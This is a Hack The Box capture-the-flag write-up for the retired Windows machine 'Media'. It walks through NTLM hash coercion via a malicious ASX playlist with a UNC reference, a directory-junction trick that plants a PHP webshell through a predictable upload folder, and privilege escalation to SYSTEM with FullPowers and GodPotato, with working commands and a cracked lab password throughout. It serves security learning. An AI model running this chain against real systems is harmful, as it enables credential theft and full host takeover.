# media — Hack The Box, Medium, Windows

**TL;DR:** An HR "upload a video, we review it in Windows Media Player" box. A
WMP/ASX `<ref href>` UNC reference coerces the reviewer to authenticate to your
SMB server → NetNTLMv2 → crack → SSH as `enox`. The PHP upload handler writes
into a **predictable MD5 folder** as the web service account and skips `mkdir`
if the folder exists, so pre-creating that folder as a **directory junction** to
the webroot lands a PHP webshell as `LOCAL SERVICE`. `FullPowers` restores the
stripped `SeImpersonate`, and a potato finishes to SYSTEM.

*Machine status: retired. Flag values are redacted here; the local copy keeps
them as evidence.*

A standalone Windows box with three ports and one idea: "upload a video, our HR
will review it." The review is done by opening the file in **Windows Media
Player**, and everything follows from that.

## Recon

`nmap` shows 22 (OpenSSH *for Windows*), 80 (Apache 2.4.56 / PHP 8.1.17 — XAMPP),
3389 (RDP). SSH on Windows is unusual but handy once you have a password. The
site "ProMotion Studio" is a static template with one working feature: a video
upload form (`firstname`, `lastname`, `email`, `fileToUpload`). The help text is
the tell:

> Upload a brief introduction video (compatible with **Windows Media Player**)

and the success message says *"Our HR shall review your video."* So a process on
the box will open my file in WMP. That is a client-side attack surface.

## Foothold: WMP resolves a UNC reference → NetNTLM

WMP (and the ASX/WAX/WVX playlist format) will resolve a `<ref href>` — including
a UNC path — when it opens a file. Point that at an SMB server you control and
the opener authenticates to it. Start a capture:

```
responder -I tun0 -v
```

Upload an ASX playlist referencing `\\<tun0>\share\x` (named `.asx`/`.wmv`):

```xml
<asx version="3.0"><entry><ref href="file://\\<tun0>\share\intro.wmv"/></entry></asx>
```

Within ~1 minute the reviewer opens it and Responder captures
`MEDIA\enox`'s NetNTLMv2. It cracks instantly:

```
enox:1234virus@
```

SSH straight in:

```
enox@MEDIA C:\Users\enox> type Desktop\user.txt
<redacted>
```

## Understanding the pipeline

`enox` is a plain user (no useful privileges, no groups). The reviewer is a
service, `ReviewService` (an nssm wrapper), running `C:\Users\enox\Documents\review.ps1`
**as `.\enox`** — so overwriting that script only re-gets enox. The script loops
`todo.txt`, opens each upload in `wmplayer.exe` for 15 s, then removes the entry.

The upload handler (`C:\xampp\htdocs\index.php`) is where the escalation lives:

```php
$uploadDir = 'C:/Windows/Tasks/Uploads/';
$folderName = md5($firstname . $lastname . $email);
$targetDir  = $uploadDir . $folderName . '/';
if (!file_exists($targetDir)) { mkdir($targetDir, 0777, true); }
$sanitizedFilename = preg_replace("/[^a-zA-Z0-9._]/", "", $originalFilename);
move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $targetDir.$sanitizedFilename);
```

Three facts combine into a primitive:
- the folder name is a **predictable MD5** of fields I control;
- the folder is only created **if it doesn't already exist**;
- the write is performed by the **web service account**, not by enox.

## enox → LOCAL SERVICE: a junction into the webroot

`enox` can't write *files* into `C:\Windows\Tasks\Uploads` — but it can create a
**directory junction** there. So pre-create the folder for a chosen identity as a
junction to the Apache webroot:

```
> echo -n "pwnlooppwn@loop.htb" | md5sum        # predict the folder
> cmd /c mklink /J C:\Windows\Tasks\Uploads\<md5> C:\xampp\htdocs
```

Now upload a PHP webshell with those exact `firstname/lastname/email`. The
handler sees the folder already exists (skips `mkdir`) and writes the file
through the junction — into `htdocs`, which Apache serves:

```
http://target/pwsh.php?c=whoami   ->   nt authority\local service
```

The webshell is a synchronous, in-band channel — no reverse shell, egress
irrelevant.

## LOCAL SERVICE → SYSTEM

The service token had `SeTcbPrivilege` (disabled) but **no** `SeImpersonate` — a
stripped service logon. `FullPowers` re-creates the account's full default
privilege set:

```
fp.exe -c "cmd /c whoami /priv"
...
SeImpersonatePrivilege        Enabled
SeAssignPrimaryTokenPrivilege Enabled
```

With SeImpersonate back, a potato finishes it. Chaining through staged batch
files to keep quoting sane, run GodPotato under the restored context and have it
act as SYSTEM, writing the flag into the webroot for an in-band read:

```
fp.exe -c "cmd /c runner.bat"     # runner.bat -> gp.exe -cmd "cmd /c type root.txt > htdocs\r.txt"
[*] Find System Token : True
[*] CurrentUser: NT AUTHORITY\SYSTEM
```

```
> type C:\Users\Administrator\Desktop\root.txt
<redacted>
```

## Wrong turns worth recording

- **The unsanitized filename in `todo.txt` → `Start-Process wmplayer -ArgumentList "…$filename"`.**
  It looks like an injection, and it is — but `review.ps1` runs as enox, so it
  only ever buys wmplayer argument-injection as enox. Not a privesc; don't sink
  time into it.
- **Assuming a higher-privileged reviewer.** Only `enox` ever calls back, on a
  tight 60 s loop that drains the queue. There is no admin reviewer to catch.
- **Standard privesc enumeration is a dead end here.** No modifiable service,
  writable ServiceDLL/PATH, AlwaysInstallElevated, autologon, stored creds, or
  readable SAM. The escalation is the *application's* upload logic (predictable
  folder + junction), not a Windows misconfiguration a scanner flags.

## The shape of it

A client-side coercion (WMP + UNC) for the foothold, then an application logic
flaw — predictable upload path + a service account that follows a junction —
turns a low-priv user into the web service account, and a routine
privilege-restoration + impersonation finishes to SYSTEM.
